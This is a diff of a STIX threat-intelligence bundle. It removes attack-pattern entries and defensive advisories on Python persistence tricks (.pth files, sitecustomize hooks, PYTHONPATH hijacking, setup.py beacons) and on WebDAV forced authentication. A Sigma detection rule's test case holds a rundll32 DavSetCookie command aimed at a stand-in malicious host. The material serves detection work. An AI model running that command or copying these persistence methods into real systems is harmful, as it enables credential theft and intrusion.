@@ -1,6 +1,6 @@
 {
   "type": "bundle",
-  "id": "bundle--5f3863d3-4d69-5b53-a037-0c8dfa71f44f",
+  "id": "bundle--913d59ca-88d1-58f0-833f-191efbf8ce7a",
   "objects": [
     {
       "type": "attack-pattern",
@@ -335,22 +335,6 @@
           "source_name": "mitre-attack",
           "external_id": "T1102",
           "url": "https://attack.mitre.org/techniques/T1102"
-        }
-      ]
-    },
-    {
-      "type": "attack-pattern",
-      "spec_version": "2.1",
-      "id": "attack-pattern--25db6d8f-4942-5e1b-b8bd-7e847a960411",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2025-01-01T00:00:00.000Z",
-      "modified": "2025-01-01T00:00:00.000Z",
-      "name": "Forced Authentication",
-      "external_references": [
-        {
-          "source_name": "mitre-attack",
-          "external_id": "T1187",
-          "url": "https://attack.mitre.org/techniques/T1187"
         }
       ]
     },
@@ -901,22 +885,6 @@
     {
       "type": "attack-pattern",
       "spec_version": "2.1",
-      "id": "attack-pattern--774b44f6-f5e9-5901-9ac5-a40f754345e5",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2025-01-01T00:00:00.000Z",
-      "modified": "2025-01-01T00:00:00.000Z",
-      "name": "Rundll32",
-      "external_references": [
-        {
-          "source_name": "mitre-attack",
-          "external_id": "T1218.011",
-          "url": "https://attack.mitre.org/techniques/T1218/011"
-        }
-      ]
-    },
-    {
-      "type": "attack-pattern",
-      "spec_version": "2.1",
       "id": "attack-pattern--78e9680c-6237-58ae-9fbc-cc54d6a2ebad",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -975,22 +943,6 @@
           "source_name": "mitre-attack",
           "external_id": "T1112",
           "url": "https://attack.mitre.org/techniques/T1112"
-        }
-      ]
-    },
-    {
-      "type": "attack-pattern",
-      "spec_version": "2.1",
-      "id": "attack-pattern--7b7b0568-13d6-5df6-8bef-c0b3fffae460",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2025-01-01T00:00:00.000Z",
-      "modified": "2025-01-01T00:00:00.000Z",
-      "name": "Path Interception by PATH Environment Variable",
-      "external_references": [
-        {
-          "source_name": "mitre-attack",
-          "external_id": "T1574.007",
-          "url": "https://attack.mitre.org/techniques/T1574/007"
         }
       ]
     },
@@ -2210,17 +2162,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--01bea83d-094b-5410-b99e-75f834cc173a",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-21T13:08:01.000Z",
-      "modified": "2026-08-21T13:08:01.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--ab2f19de-f275-5bdf-a247-c5a5f2d60476",
-      "target_ref": "attack-pattern--65c46ec0-1d8a-5475-ac40-da65faef6306"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--01c1462b-9793-5d92-af92-1b73c7733f35",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -3178,17 +3119,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--10b4059c-278c-5c43-86df-fb9bea8e8ac0",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-21T13:07:51.000Z",
-      "modified": "2026-08-21T13:07:51.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--dd0fe71f-a93a-5ff8-832c-61ba4f4557fb",
-      "target_ref": "attack-pattern--25db6d8f-4942-5e1b-b8bd-7e847a960411"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--10cea141-3324-5de4-b3d1-368105551d0c",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-28T23:34:49.000Z",
@@ -3585,17 +3515,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--198ef2f1-1c18-5476-a5cb-417bd7a3be9c",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-21T13:08:12.000Z",
-      "modified": "2026-08-21T13:08:12.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--c9157af5-f460-5fe4-92ee-77fd2b3bc753",
-      "target_ref": "attack-pattern--d14a8d82-ce61-5344-abe4-5d71bb25404b"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--1996571a-8dd5-59f2-8bf3-d989cf0fe7d5",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -3867,17 +3786,6 @@
       "relationship_type": "has",
       "source_ref": "software--56f7c800-22eb-5c3a-a606-dad31368b1b0",
       "target_ref": "vulnerability--c4989f83-a9ca-5b51-bbfb-289feeaa567f"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
-      "id": "relationship--1f8b865d-4973-5fe2-9526-9eb8719469cf",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-21T13:07:51.000Z",
-      "modified": "2026-08-21T13:07:51.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--dd0fe71f-a93a-5ff8-832c-61ba4f4557fb",
-      "target_ref": "attack-pattern--774b44f6-f5e9-5901-9ac5-a40f754345e5"
     },
     {
       "type": "relationship",
@@ -5455,17 +5363,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--3a652d41-402c-535c-9ace-fedfa162ca28",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-21T13:08:22.000Z",
-      "modified": "2026-08-21T13:08:22.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--00a2780f-f792-5cbf-8b03-6aaf3aabd793",
-      "target_ref": "attack-pattern--d14a8d82-ce61-5344-abe4-5d71bb25404b"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--3a7ec296-440f-53de-a92d-e38e1b9f86d1",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-23T01:33:58.000Z",
@@ -6775,17 +6672,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--518338a0-6f18-5383-8618-fb89e4850d6e",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-21T13:08:31.000Z",
-      "modified": "2026-08-21T13:08:31.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--7f83cf77-9587-5558-832c-3d19a68d00e2",
-      "target_ref": "attack-pattern--1c2f2ef4-96d1-5f02-86f0-bf0721251ef2"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--5207fcff-6ac6-564f-8dc1-a0a6abd995c2",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-31T17:58:47.000Z",
@@ -8051,17 +7937,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--66bcf639-cdea-5fe3-b8af-5264f8cb2059",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-21T13:08:12.000Z",
-      "modified": "2026-08-21T13:08:12.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--c9157af5-f460-5fe4-92ee-77fd2b3bc753",
-      "target_ref": "attack-pattern--1c2f2ef4-96d1-5f02-86f0-bf0721251ef2"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--66df4ede-809d-5382-a2c3-eb2650aac603",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-21T15:25:32.000Z",
@@ -8817,17 +8692,6 @@
       "relationship_type": "uses",
       "source_ref": "report--ef579d71-bc61-5f1b-a56f-39554a873338",
       "target_ref": "attack-pattern--2e4d9280-53f9-5f98-9c79-9970f1080b3d"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
-      "id": "relationship--7458f851-c536-59b2-86d0-30741e3a64bf",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-21T13:08:12.000Z",
-      "modified": "2026-08-21T13:08:12.000Z",
-      "relationship_type": "attributed-to",
-      "source_ref": "report--c9157af5-f460-5fe4-92ee-77fd2b3bc753",
-      "target_ref": "threat-actor--36c38a30-dadc-52f4-89ae-7250ec4c8967"
     },
     {
       "type": "relationship",
@@ -12869,17 +12733,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--bcd0b7d6-3776-5852-8821-51ea900bc8b8",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-21T13:08:01.000Z",
-      "modified": "2026-08-21T13:08:01.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--ab2f19de-f275-5bdf-a247-c5a5f2d60476",
-      "target_ref": "attack-pattern--d14a8d82-ce61-5344-abe4-5d71bb25404b"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--bcfd4b67-6aac-5593-93f5-c1d769d9d31b",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -13492,17 +13345,6 @@
       "relationship_type": "uses",
       "source_ref": "report--e0ae5ef6-6c9f-5216-a309-d21edcd7467c",
       "target_ref": "attack-pattern--2e4d9280-53f9-5f98-9c79-9970f1080b3d"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
-      "id": "relationship--c74ab240-2f82-5d86-ae0b-5570483da1ec",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-21T13:08:22.000Z",
-      "modified": "2026-08-21T13:08:22.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--00a2780f-f792-5cbf-8b03-6aaf3aabd793",
-      "target_ref": "attack-pattern--7b7b0568-13d6-5df6-8bef-c0b3fffae460"
     },
     {
       "type": "relationship",
@@ -16290,17 +16132,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--f64bd273-bd03-5ee0-975f-4804f242ffbd",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-21T13:08:31.000Z",
-      "modified": "2026-08-21T13:08:31.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--7f83cf77-9587-5558-832c-3d19a68d00e2",
-      "target_ref": "attack-pattern--d14a8d82-ce61-5344-abe4-5d71bb25404b"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--f76a3735-5635-5ce8-8e91-570a6bc0aad9",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -16880,48 +16711,6 @@
       "relationship_type": "uses",
       "source_ref": "report--07480861-9f0c-57b8-9d1b-0c96fca1fce1",
       "target_ref": "attack-pattern--2e4d9280-53f9-5f98-9c79-9970f1080b3d"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
-      "id": "report--00a2780f-f792-5cbf-8b03-6aaf3aabd793",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-21T13:08:22.000Z",
-      "modified": "2026-08-21T13:08:22.000Z",
-      "name": "Abuse of PYTHONPATH for Python Module Hijacking and Persistence",
-      "description": "## Overview\n\nAdversaries are targeting Python environments by manipulating the PYTHONPATH environment variable, a mechanism used by the Python interpreter to locate modules for import. By altering this variable - often via registry modifications - an attacker can force Python to load libraries from an attacker-controlled directory instead of legitimate locations. This technique facilitates module hijacking, allowing the attacker to execute arbitrary code with the privileges of the user who invokes the Python interpreter. This activity is frequently observed in conjunction with the installation of malicious Python packages, serving as both a method for initial code execution and a persistent backdoor that activates automatically upon future Python sessions. Defenders should monitor registry modifications affecting environmental paths during package management workflows.\n\n## Attack Chain\n\n1. Attacker delivers a malicious payload or script to the target system.\n2. The target user or an automated process executes a Python package installation (e.g., via `pip`).\n3. The installer triggers a process that interacts with the Windows environment configuration.\n4. The malicious process or installer modifies the `HKCU\\Environment\\PYTHONPATH` registry key.\n5. The attacker places a malicious Python module (e.g., a `.py` file) in the directory specified by the modified PYTHONPATH.\n6. The victim executes a standard Python application or script.\n7. The Python interpreter traverses the modified PYTHONPATH, prioritizes the malicious directory, and loads the attacker's module.\n8. Malicious code within the hijacked module executes, providing the attacker with sustained, user-level persistence.\n\n## Impact\n\nSuccessful exploitation allows for arbitrary code execution and persistent access to the target host. Because the persistence mechanism relies on the standard Python import lookup process, the attacker's code runs every time the user invokes Python, potentially leading to credential theft, data exfiltration, or further lateral movement within the network.\n\n## Recommendation\n\n* Enable Sysmon Event ID 1 (Process Creation) and Event ID 13 (Registry Value Set) to monitor for unauthorized changes to the `PYTHONPATH` environment variable.\n* Deploy the provided Sigma rule to detect registry modifications to the `PYTHONPATH` key performed by processes associated with Python package installation.\n* Investigate any process modifying `HKCU\\Environment\\PYTHONPATH` if it originates from an unexpected parent process or is not part of a known, approved development workflow.\n",
-      "published": "2026-08-21T13:08:22.000Z",
-      "labels": [
-        "persistence",
-        "python",
-        "registry",
-        "supply-chain",
-        "windows"
-      ],
-      "object_refs": [
-        "attack-pattern--7b7b0568-13d6-5df6-8bef-c0b3fffae460",
-        "attack-pattern--d14a8d82-ce61-5344-abe4-5d71bb25404b",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-python-path-hijack",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-python-path-hijack/"
-        }
-      ],
-      "confidence": 60,
-      "x_craftedsignal_brief_id": "brief-2026-08-python-path-hijack",
-      "x_craftedsignal_event_id": "brief-2026-08-python-path-hijack",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-python-path-hijack/",
-      "x_craftedsignal_activity_at": "2026-08-21T13:08:22.000Z",
-      "x_craftedsignal_severity": "medium",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
-      "x_craftedsignal_kev_status": "unknown"
     },
     {
       "type": "report",
@@ -28328,47 +28117,6 @@
     {
       "type": "report",
       "spec_version": "2.1",
-      "id": "report--7f83cf77-9587-5558-832c-3d19a68d00e2",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-21T13:08:31.000Z",
-      "modified": "2026-08-21T13:08:31.000Z",
-      "name": "Abuse of Python Site-Package Hooks for Persistence",
-      "description": "## Overview\n\nAdversaries are leveraging Python site initialization hooks to establish persistence on compromised Windows, Linux, and macOS endpoints. By planting a 'sitecustomize.py' or 'usercustomize.py' script within 'site-packages' or 'dist-packages' directories, an attacker ensures their malicious code is automatically executed every time the Python interpreter starts. This technique, notably used by the VIPERTUNNEL backdoor to trigger subsequent DLL-based payloads, effectively hides malicious logic within the standard Python environment. Defenders should focus on monitoring for the creation of these specific files in conjunction with software installation processes, as this behavior often indicates a supply chain compromise or the final stage of a malware deployment.\n\n## Attack Chain\n\n1. Attacker identifies a target system with existing Python environments and accessible site-packages or dist-packages directories.\n2. Attacker initiates a malicious installation process or abuses legitimate package managers to gain execution context.\n3. Attacker writes a malicious script named 'sitecustomize.py' or 'usercustomize.py' to a directory included in the Python 'sys.path'.\n4. The malicious hook script contains logic to import malicious libraries or execute shell commands.\n5. The attacker completes the package installation or masquerades as a legitimate installation to evade initial detection.\n6. A user or system process subsequently invokes the Python interpreter for normal operations.\n7. The Python 'site' module automatically detects and executes the planted hook file during initialization.\n8. The malicious payload executes in the security context of the user or service running the Python process, achieving persistence.\n\n## Impact\n\nThis technique enables persistent arbitrary code execution with the permissions of the invoking Python process. Depending on the target environment, this could lead to full system compromise, data exfiltration, or lateral movement. It has been observed in the wild supporting the VIPERTUNNEL backdoor, which uses this persistence mechanism to facilitate further stages of an attack.\n\n## Recommendation\n\n- Enable Sysmon or equivalent endpoint logging for both process creation (Event ID 1) and file creation (Event ID 11).\n- Deploy the provided Sigma rule to monitor the creation of 'sitecustomize.py' or 'usercustomize.py' files during package installation events.\n- Investigate any detected files by inspecting the file contents and the parent process that performed the write operation to distinguish between legitimate environment configuration and malicious activity.\n",
-      "published": "2026-08-21T13:08:31.000Z",
-      "labels": [
-        "endpoint-security",
-        "persistence",
-        "python",
-        "supply-chain"
-      ],
-      "object_refs": [
-        "attack-pattern--1c2f2ef4-96d1-5f02-86f0-bf0721251ef2",
-        "attack-pattern--d14a8d82-ce61-5344-abe4-5d71bb25404b",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-python-site-hooks",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-python-site-hooks/"
-        }
-      ],
-      "confidence": 60,
-      "x_craftedsignal_brief_id": "brief-2026-08-python-site-hooks",
-      "x_craftedsignal_event_id": "brief-2026-08-python-site-hooks",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-python-site-hooks/",
-      "x_craftedsignal_activity_at": "2026-08-21T13:08:31.000Z",
-      "x_craftedsignal_severity": "medium",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
       "id": "report--7ff9f2af-2280-51d4-a612-3c278dadaed8",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-28T21:13:28.000Z",
@@ -31945,47 +31693,6 @@
     {
       "type": "report",
       "spec_version": "2.1",
-      "id": "report--ab2f19de-f275-5bdf-a247-c5a5f2d60476",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-21T13:08:01.000Z",
-      "modified": "2026-08-21T13:08:01.000Z",
-      "name": "Suspicious Network Activity During Python Package Installation",
-      "description": "## Overview\n\nAdversaries are increasingly leveraging the Python ecosystem to facilitate software supply chain compromises by embedding malicious logic within package build processes. Specifically, threat actors can manipulate setup.py scripts or leverage setuptools command classes to execute arbitrary code the moment a user or automated system executes a pip install command. This activity allows for the establishment of C2 beacons or data exfiltration directly from build-time processes, often bypassing traditional perimeter defenses. Detection requires monitoring for anomalous outbound network connections originating from Python processes during the package build or installation lifecycle. This behavior is significant as it provides attackers with immediate execution and network access upon the deployment of a seemingly legitimate package.\n\n## Attack Chain\n\n1. Attacker publishes a malicious package to a public or private repository (e.g., PyPI) containing an obfuscated or legitimate-looking setup.py file.\n2. A victim or build server executes 'pip install' for the malicious package.\n3. The Python environment invokes the package's build process, triggering the execution of the malicious setup.py or associated install scripts.\n4. The malicious script utilizes setuptools command classes to gain execution context within the Python process.\n5. The Python process initiates an unauthorized outbound network connection (e.g., via socket or request libraries) to an attacker-controlled C2 domain.\n6. The attacker receives a beacon, confirming the successful installation and environment foothold.\n7. The attacker proceeds with secondary payload delivery or data exfiltration from the build environment.\n\n## Impact\n\nSuccessful exploitation of this technique can lead to complete compromise of build infrastructure, source code theft, or the injection of malicious code into downstream software products. This poses a significant risk to CI/CD pipelines and developer workstations, potentially impacting entire organizations through compromised software updates.\n\n## Recommendation\n\n- Enable Sysmon process-creation (Event ID 1) and network-connection (Event ID 3) logging on all developer workstations and build servers.\n- Deploy the Sigma rules below to monitor for Python processes initiating network connections during build-wheel processes.\n- Investigate any network destinations contacted by Python during package installation that do not align with known, trusted software repositories or mirror sites.\n- Implement environment-specific allowlisting for network egress from build processes to limit unauthorized C2 communication.\n",
-      "published": "2026-08-21T13:08:01.000Z",
-      "labels": [
-        "anomaly-detection",
-        "build-security",
-        "python",
-        "supply-chain"
-      ],
-      "object_refs": [
-        "attack-pattern--65c46ec0-1d8a-5475-ac40-da65faef6306",
-        "attack-pattern--d14a8d82-ce61-5344-abe4-5d71bb25404b",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-python-package-build-anomaly",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-python-package-build-anomaly/"
-        }
-      ],
-      "confidence": 60,
-      "x_craftedsignal_brief_id": "brief-2026-08-python-package-build-anomaly",
-      "x_craftedsignal_event_id": "brief-2026-08-python-package-build-anomaly",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-python-package-build-anomaly/",
-      "x_craftedsignal_activity_at": "2026-08-21T13:08:01.000Z",
-      "x_craftedsignal_severity": "medium",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
       "id": "report--ab3e6128-a23d-56fa-a0b6-413a5cbb9964",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-25T09:59:33.000Z",
@@ -35214,48 +34921,6 @@
     {
       "type": "report",
       "spec_version": "2.1",
-      "id": "report--c9157af5-f460-5fe4-92ee-77fd2b3bc753",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-21T13:08:12.000Z",
-      "modified": "2026-08-21T13:08:12.000Z",
-      "name": "TeamPCP Persistence via Malicious Python .pth Files",
-      "description": "## Overview\n\nThe threat actor group TeamPCP has been identified exploiting the Python interpreter's behavior regarding path configuration files (.pth). During the supply chain compromise of the 'litellm' package, the actors embedded malicious .pth files within the package distribution. When these packages are installed, the .pth file is placed into the site-packages or dist-packages directory. The Python interpreter automatically processes these files upon every subsequent invocation, leading to persistent, arbitrary code execution on the compromised host. This technique is particularly effective as it bypasses traditional execution controls and remains active regardless of how the Python application is built or distributed. Defenders should monitor for the correlation between Python process execution and the creation of .pth files in sensitive package directories.\n\n## Attack Chain\n\n1. The adversary publishes a malicious version of a legitimate Python package (e.g., 'litellm') to a public repository.\n2. A target user installs the malicious package via 'pip' or other standard package managers.\n3. The malicious installation script triggers a process (e.g., python.exe) to handle package setup.\n4. The installation process writes a malicious .pth file to the target's 'site-packages' or 'dist-packages' directory.\n5. The attacker's code inside the .pth file is configured to execute upon Python startup.\n6. The victim executes a local Python script or application on the host.\n7. The Python interpreter automatically parses the directory, discovers the .pth file, and executes the contained malicious commands.\n8. The attacker achieves persistence and potential full control over the compromised environment.\n\n## Impact\n\nSuccessful exploitation results in persistent arbitrary code execution on the target endpoint. Any host that installs the compromised package, including developers and automated CI/CD build environments, becomes infected. This enables data exfiltration, lateral movement, and long-term access to the internal network.\n\n## Recommendation\n\n- Enable Sysmon logging for Event ID 1 (Process Creation) and Event ID 11 (File Creation) to capture .pth file modifications.\n- Deploy the provided Sigma rule to detect the specific correlation between python.exe activity and .pth file creation.\n- Review the contents of any .pth files found in site-packages or dist-packages for suspicious imports or command execution scripts.\n- Audit Python environments for unauthorized changes to package installation directories.\n",
-      "published": "2026-08-21T13:08:12.000Z",
-      "labels": [
-        "persistence",
-        "persistence-technique",
-        "python",
-        "supply-chain-compromise"
-      ],
-      "object_refs": [
-        "attack-pattern--1c2f2ef4-96d1-5f02-86f0-bf0721251ef2",
-        "attack-pattern--d14a8d82-ce61-5344-abe4-5d71bb25404b",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-        "threat-actor--36c38a30-dadc-52f4-89ae-7250ec4c8967"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-python-pth-persistence",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-python-pth-persistence/"
-        }
-      ],
-      "confidence": 60,
-      "x_craftedsignal_brief_id": "brief-2026-08-python-pth-persistence",
-      "x_craftedsignal_event_id": "brief-2026-08-python-pth-persistence",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-python-pth-persistence/",
-      "x_craftedsignal_activity_at": "2026-08-21T13:08:12.000Z",
-      "x_craftedsignal_severity": "medium",
-      "x_craftedsignal_type": "threat",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
       "id": "report--c9b8dd99-90e3-5f42-b13b-da3da719ce03",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-31T11:16:47.000Z",
@@ -36600,41 +36265,6 @@
         "status": "unknown"
       },
       "x_craftedsignal_cvss_max": 7.3,
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
-      "id": "report--dd0fe71f-a93a-5ff8-832c-61ba4f4557fb",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-21T13:07:51.000Z",
-      "modified": "2026-08-21T13:07:51.000Z",
-      "name": "Detection of Rare WebDAV Connections for Forced Authentication",
-      "description": "## Overview\n\nThis detection brief addresses the abuse of Web Distributed Authoring and Versioning (WebDAV) to facilitate credential theft through forced authentication. Attackers inject malicious WebDAV paths into files or features - such as LNK files, documents, or UI elements - that, when accessed by a victim, cause the Windows host to initiate an NTLM authentication attempt against a server controlled by the attacker. By utilizing `rundll32.exe` to trigger these connections via `DavSetCookie`, adversaries can bypass standard defensive perimeters and capture NetNTLM hashes for offline cracking or relaying. This technique allows for credential access without requiring direct exploit code execution on the endpoint, instead abusing legitimate system binaries and network protocols to exfiltrate identity material.\n\n## Attack Chain\n\n1. Attacker hosts a malicious WebDAV server infrastructure accessible over the internet.\n2. Attacker crafts a lure file (e.g., LNK file or Office document) containing a URI pointing to the malicious WebDAV resource.\n3. Victim opens the lure file on a Windows host.\n4. The host process invokes `rundll32.exe` with `url.dll,DavSetCookie` or similar parameters to attempt a connection to the URI.\n5. The Windows WebClient service automatically attempts NTLM authentication to the remote WebDAV server to establish the connection.\n6. The attacker's server captures the incoming NetNTLM hash during the handshake.\n7. Attacker performs offline password cracking or relays the hash to gain further access within the environment.\n\n## Impact\n\nSuccessful exploitation results in the compromise of user credentials, facilitating further lateral movement, privilege escalation, or full account takeover. The scope of impact is highly dependent on the victim's account privileges, but it frequently leads to domain-wide compromise if the captured credentials have elevated permissions.\n\n## Recommendation\n\nDeploy the provided Sigma rule to detect anomalous `rundll32.exe` execution patterns indicating WebDAV interaction. Enable process-creation auditing across all Windows endpoints to capture command-line arguments. Review logs for connections to unknown or newly observed domains initiated by `rundll32.exe`. If an alert triggers, inspect the destination domain reputation and verify if the user activity corresponds to an expected business task or an inadvertent link/file interaction.\n\n## Rules\n\n- title: \"Detect Rare Connection to WebDAV Target via Rundll32\"\n description: \"Detects suspicious rundll32.exe process creation involving DavSetCookie, which is indicative of potential WebDAV-based forced authentication attacks.\"\n logsource:\n category: \"process_creation\"\n product: \"windows\"\n detection:\n selection:\n Image|endswith: \"\\\\rundll32.exe\"\n CommandLine|contains: \"DavSetCookie\"\n condition: selection\n level: \"medium\"\n tags:\n - \"attack.credential_access\"\n - \"attack.t1187\"\n - \"attack.t1218.011\"\n tests:\n positive:\n - name: \"Rundll32 DavSetCookie execution\"\n data:\n - Image: \"C:\\\\Windows\\\\System32\\\\rundll32.exe\"\n CommandLine: \"rundll32.exe url.dll,DavSetCookie http://malicious.example.com/test\"\n negative:\n - name: \"Legitimate browser execution\"\n data:\n - Image: \"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\"\n CommandLine: \"chrome.exe\"\n falsepositives:\n - \"Legitimate administrative tools or software installers that legitimately utilize WebDAV resources for file synchronization or internal updates.\"\n handoff:\n detection_confidence: \"medium\"\n required_telemetry:\n - log_source: \"Windows Event ID 4688 or Sysmon Event ID 1\"\n event_or_channel: \"Process Creation\"\n required_fields:\n - \"Image\"\n - \"CommandLine\"\n availability: \"available\"\n notes: \"Requires command-line auditing enabled.\"\n validation:\n status: \"needs_environment_validation\"\n steps:\n - \"Execute 'rundll32.exe url.dll,DavSetCookie http://127.0.0.1/test' in a controlled lab environment.\"\n known_evasions:\n - \"Use of alternative binaries to trigger WebDAV authentication.\"\n limitations:\n - \"Only detects execution via rundll32.exe.\"\n tuning:\n - source: \"Internal file sync services\"\n guidance: \"Add known internal and trusted WebDAV servers to an allowlist in the detection logic.\"\n suggested_owner: \"Detection Engineering\"\n",
-      "published": "2026-08-21T13:07:51.000Z",
-      "object_refs": [
-        "attack-pattern--25db6d8f-4942-5e1b-b8bd-7e847a960411",
-        "attack-pattern--774b44f6-f5e9-5901-9ac5-a40f754345e5",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-rare-webdav-connection",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-rare-webdav-connection/"
-        }
-      ],
-      "confidence": 60,
-      "x_craftedsignal_brief_id": "brief-2026-08-rare-webdav-connection",
